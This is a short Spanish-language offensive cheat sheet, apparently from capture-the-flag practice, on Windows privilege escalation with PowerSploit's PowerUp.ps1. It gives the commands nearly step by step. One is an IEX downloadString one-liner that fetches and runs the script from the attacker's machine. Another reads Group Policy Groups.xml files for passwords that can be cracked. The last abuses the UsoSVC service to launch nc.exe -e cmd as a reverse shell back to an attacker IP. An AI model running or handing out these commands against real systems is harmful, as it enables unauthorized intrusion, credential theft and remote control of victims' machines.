** Powersploit de Github **
`git clone https://github.com/PowerShellMafia/PowerSploit.git`

Elevación de privilegios en un sólo paso.
> Modificar archivo /powersploit/privesc/powerUp.ps1
> Colocar en la última línea: 
> `Invoke-AllChecks`
> Servidor web en máquina local desde la que se ofrece el archivo powerUp.ps1
> `python -m SimpleHTTPServer 80`
> Descargar archivo powerUp.ps1 desde máquina objetivo con el módulo Internet Explorer. Se ejecutará automáticamente y no habrá que cargar el módulo en Powershell gracias a la modificación en el archivo previamente realizada.
> `IEX(New-Object Net.WebClient).downloadString('http://<own_ip>:<puerto>/powerUp.ps1')`

Elevación de privilegios en dos pasos.
> Transferimos el archivo PowerUp.ps1 sin modificar:
> `Invoke-WebRequest http://10.10.14.6:8000/PowerUp.ps1 -o PowerUp.ps1`
> Importamos el módulo:
> `Import-Module ./PowerUp.ps1`
> Ejecutar función específica del módulo ya cargado:
> `Invoke-AllChecks | Out-File -Encoding ASCII checks.txt`

** Posibles elementos a buscar tras la ejecución de PowerUp.ps1 **
Buscar archivo Groups.xml. 
> Estos archivos pueden contener credenciales donde la contraseña está hasheada, pero puede crackearse con "gpp-decrypt". Este archivo puede leerse en la ruta:
> `type "C:\ProgramData\Microsoft\Group Policy\History\{xxxx}\Machine\Preferences\Groups\Groups.xml`

Servicio --> AbuseFunction: Invoke-ServiceAbuse -Name 'UsoSVC'.
> Este servicio permite añadir un comando a ejecutar.
> Añadir comando para recibir una reverse-shell con netcat.
> Compartir binario nc.exe, transferirlo a la máquina objetivo y ejecutar un cmd.
> Ejecutar servicio:
> `Invoke-ServiceAbuse -Name 'UsoSVC' -Command "C:\Windows\Temp\nc.exe -e cmd 10.10.14.6 443"` 